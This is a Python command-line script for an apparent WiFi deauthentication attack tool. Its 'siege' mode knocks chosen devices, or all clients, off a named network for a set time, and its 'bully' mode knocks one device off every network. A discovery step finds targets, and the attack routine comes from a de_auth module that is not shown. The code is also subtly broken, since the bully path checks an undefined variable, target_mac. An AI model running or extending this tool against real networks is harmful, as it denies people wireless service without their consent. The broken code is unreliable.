import argparse
import os
import re
import subprocess
import sys

from de_auth import begin_attack
import parse_data


_mac_address_pattern = re.compile('[0-9A-F]{2}(:[0-9A-F]{2}){5}')
_duration_multiplier = {
    's': 1,
    'm': 60,
    'h': 60 * 60,
}


def mac_address_or_all(addr):
    if addr.lower() == 'all':
        return 'all'
    return mac_address(addr)


def mac_address(addr):
    """ mac_address checks that a given string is in MAC address format """
    mac = addr.upper()
    if not _mac_address_pattern.fullmatch(mac):
        raise TypeError('{} does not match a MAC address pattern'.format(addr))
    return mac


def ip_address(addr):
    """ ip_address checks that a given string is in IP address format """
    parts = addr.split('.')
    if len(parts) != 4:
        raise TypeError('{} does not match an IP address pattern'.format(addr))
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                raise TypeError('{} does not match an IP address pattern'.format(addr))
        except ValueError:
            raise TypeError('{} does not match an IP address pattern'.format(addr))
    return addr


def duration(dur):
    try:
        mult = _duration_multiplier[dur[-1]]
        return int(dur[:-1]) * mult
    except:
        raise TypeError('{} does not match a duration pattern'.format(dur))


def parse_args():
    parser = argparse.ArgumentParser(description='Deauthenticate targets from a wifi network.')

    subparsers = parser.add_subparsers(title="actions", description='valid actions (no action means to deauth a set of targets)', dest='action')
    deauth_parser = subparsers.add_parser('siege', help='deauth some set of targets from specified networks')
    deauth_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
    deauth_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
    deauth_parser.add_argument('essid', help='the name of the network to send deauth packets to')
    deauth_parser.add_argument('target', nargs='+', type=mac_address_or_all, help='the MAC addresses to deauth (use "all" to target everything)')

    bully_parser = subparsers.add_parser('bully', help='deauth a target from all networks')
    bully_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
    bully_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
    bully_parser.add_argument('target', type=mac_address, help='the MAC address to deauth')

    discover_parser = subparsers.add_parser('discover', help='locate targets to deauth')

    args = parser.parse_args()
    if args.action is None:
        parser.print_help()
        sys.exit(0)
    return args


def discover_network(args=None):
    while True:
        try:
            essid_data = parse_data.parse_network_packets(parse_data.get_file_name())
            break
        except:
            print('running discover.sh')
            __location__ = os.path.realpath(
                        os.path.join(os.getcwd(), os.path.dirname(__file__)))
            discover_script_path = os.path.join(__location__, 'discovery.sh')
            discovery_results = subprocess.run([discover_script_path], stderr=subprocess.PIPE)
            if discovery_results.returncode != 0:
                print(discovery_results.stderr, file=sys.stderr)
                sys.exit(1)

    if args is not None:
        # if args are passed in, then we need to print the data
        parse_data.display_json(essid_data)
        return
    inverted_index = parse_data.invert_index(essid_data)
    return essid_data, inverted_index


def deauth_clients(args):
    # targets to deauth
    target_all = 'all' in args.target
    targets = [] if target_all else [t for t in args.target if t != 'all']

    kwargs = {
        'mode': 'siege',
        'net_clients': targets,
        'ESSID': args.essid,
        'attack_time': args.attack_duration,
        'wireless_adapter': args.adapter,
    }

    essid_data, inverted_index = discover_network()

    begin_attack(essid_data, inverted_index, **kwargs)


def bully_target(args):
    kwargs = {
        'mode': 'bully',
        'victims_mac': args.target,
        'attack_time': args.attack_duration,
        'wireless_adapter': args.adapter,
    }

    essid_data, inverted_index = discover_network()

    if target_mac not in inverted_index:
        print('target not found', file=sys.stderr)
        sys.exit(1)

    begin_attack(essid_data, inverted_index, **kwargs)


def main():
    actions = {
        'siege': deauth_clients,
        'bully': bully_target,
        'discover': discover_network,
    }
    args = parse_args()
    actions[args.action](args)


if __name__ == '__main__':
    main()
